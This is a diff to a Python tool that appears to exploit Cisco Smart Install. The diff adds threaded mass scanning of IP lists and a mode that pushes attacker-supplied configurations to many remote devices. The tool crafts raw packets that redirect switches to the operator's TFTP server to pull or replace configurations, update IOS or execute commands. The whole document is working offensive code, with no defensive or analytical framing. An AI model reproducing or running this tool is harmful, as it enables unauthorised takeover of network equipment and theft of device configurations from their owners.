@@ -10,8 +10,12 @@ import sys
 import subprocess
 import time
 import threading
-import Queue
-
+try:
+    import Queue as queue
+except ImportError:
+    # Queue is queue in python3
+    print('[ERROR]: Does not support python3 yet!')
+    raise SystemExit
 
 def get_argm_from_user():  # Set arguments for running
     parser = argparse.ArgumentParser()
@@ -23,11 +27,19 @@ def get_argm_from_user():  # Set arguments for running
                         help="Get cisco configuration file from device and store it in conf/ directory")
     parser.add_argument("-c", "--change_config", dest="mode", const="change_config", action="store_const",
                         help="Install a new configuration file to the remote device")
+    parser.add_argument("-C", "--change_multi", dest="mode", const="change_multi", action="store_const",
+                        help="Install new configuration files to multiple remote devices")    
     parser.add_argument("-u", "--update_ios", dest="mode", const="update_ios", action="store_const",
                         help="Updating IOS on the remote device")
     parser.add_argument("-e", "--execute", dest="mode", const="execute", action="store_const",
                         help="Execute code on device (new IOS versions: 3.6.0E+ & 15.2(2)E+")
+    parser.add_argument('--thread-count', metavar='', default=100, type=int,
+                        help='Number of threads to be spawned (default: %(default)s)\n\n')
     args = parser.parse_args()
+    if args.mode is None:
+        parser.print_help()
+        sys.exit(0)
+
     return args
 
 
@@ -72,7 +84,7 @@ def get_file_for_tftp(mode): # Creating directories, configuration files and exe
                 nfile = 'execute.txt'
 
         except (IOError, OSError) as why:
-            print str(why)
+            print(str(why))
             print('[ERROR]: Check the file and try again.')
             exit()
 
@@ -87,7 +99,7 @@ def get_file_for_tftp(mode): # Creating directories, configuration files and exe
                 nfile = 'my_exec.txt'
 
         except (IOError, OSError) as why:
-            print str(why)
+            print(str(why))
             print('[ERROR]: Check the file and try again.')
             exit()
 
@@ -108,7 +120,7 @@ def get_ios_for_tftp():  # Creating nessesary files for IOS update
         f.close()
 
     except (IOError, OSError) as why:
-        print str(why)
+        print(str(why))
         print('[ERROR]: Check the file and try again.')
         exit()
 
@@ -189,6 +201,11 @@ def test_device(current_ip): # Testing for smart install
     # print('[DEBUG]: Decoded packet to sent: ' + sTcp.decode('hex'))
     conn_with_client(sTcp.decode('hex'), current_ip, mode=1)
 
+def test_device_scheduler(hosts_to_scan_queue):
+  while not hosts_to_scan_queue.empty():
+      host = hosts_to_scan_queue.get()
+      test_device(host)
+      hosts_to_scan_queue.task_done()
 
 def change_tftp(mode, current_ip):  # Send package for changing tftp address
 
@@ -201,6 +218,18 @@ def change_tftp(mode, current_ip):  # Send package for changing tftp address
         config_file = get_file_for_tftp('config')
         fConf = 'tftp://' + my_ip + '/' + config_file
         sTime = get_time_from_user()
+
+        sDump1 = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '3' + '0' * 5 + '128' + '0' * 7 + '3' + '0' * 23 + '2' + '0' * 15 + '1' + '0' * 6
+        sDump2 = '0' * (264 - len(fConf) * 2)
+        sTcp = sDump1 + ('%02x' % int(sTime[0:2])) + '0' * 6 + ('%02x' % int(sTime[3:5])) + '0' * 264 + fConf.encode(
+            'hex') + sDump2
+
+    elif mode == 'change_multi':
+        if not os.path.isdir("tftp/conf") and not os.path.exists("tftp/conf"):
+            os.mkdir('tftp/conf', 0755);
+        config_file = 'conf/' + current_ip + '.conf'
+        fConf = 'tftp://' + my_ip + '/' + config_file
+        sTime = '00:01'
 
         sDump1 = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '3' + '0' * 5 + '128' + '0' * 7 + '3' + '0' * 23 + '2' + '0' * 15 + '1' + '0' * 6
         sDump2 = '0' * (264 - len(fConf) * 2)
@@ -254,19 +283,38 @@ def change_tftp(mode, current_ip):  # Send package for changing tftp address
 
 def main():
     args = get_argm_from_user()
-
     if args.mode == 'test':
-        current_ip = args.IP
-        test_device(current_ip)
+        if args.list_IP:
+            hosts_to_scan_queue = queue.Queue()
+            with open(args.list_IP, 'r') as list:
+                [hosts_to_scan_queue.put(line.strip()) for line in list]
+
+            try:
+                threads = []
+                for _ in range(args.thread_count):
+                    thread = threading.Thread(target=test_device_scheduler, args=(hosts_to_scan_queue,))
+                    threads.append(thread)
+                    thread.daemon=True
+                    thread.start()
+
+            except Exception as err:
+                print('[ERROR]: Taking down all testing threads!')
+                print(err)
+            finally:
+                for thread in threads: thread.join()
+
+        else:
+            current_ip = args.IP
+            test_device(current_ip)
 
     else:
         tftp = subprocess.Popen(["python", "sTFTP.py"])
 
-        if args.mode != 'get_config':
+        if args.mode != 'change_multi' and args.mode != 'get_config':
             current_ip = args.IP
             change_tftp(args.mode, current_ip)
 
-        elif args.mode == 'get_config':
+        elif args.mode == 'change_multi' or args.mode == 'get_config':
             if args.IP:
                 current_ip = args.IP
                 change_tftp(args.mode, current_ip)
@@ -280,14 +328,14 @@ def main():
                             change_tftp(args.mode, ip)
                             q.task_done()
 
-                    q = Queue.Queue()
+                    q = queue.Queue()
 
                     with open(args.list_IP, 'r') as list:
                         for line in list:
                             ip = line.strip()
-                            q.put(ip)
+                            if ip: q.put(ip)
 
-                    for i in range(50):
+                    for i in range(args.thread_count):
                         t = threading.Thread(target=worker)
                         t.daemon = True
                         t.start()
@@ -295,7 +343,7 @@ def main():
                     q.join()
 
                 except (IOError, OSError) as why:
-                    print str(why)
+                    print(str(why))
                     print('[ERROR]: Check the file and try again.')
                     exit()
 
@@ -305,8 +353,10 @@ def main():
                 except KeyboardInterrupt:
                     print('[INFO]: You pressed Ctrl+C, exit.')
                     exit()
-
-            print('[INFO]: Getting config done')
+            if args.mode == 'get_config':
+                print('[INFO]: Getting config done')
+            elif args.mode == 'change_multi':
+                print('[INFO]: Packet sent, next')
 
         else:
             print('[ERROR]: Choose the tool mode (test/get_config/change_config/update_ios/execute)')
@@ -317,3 +367,4 @@ def main():
 
 
 main()
+
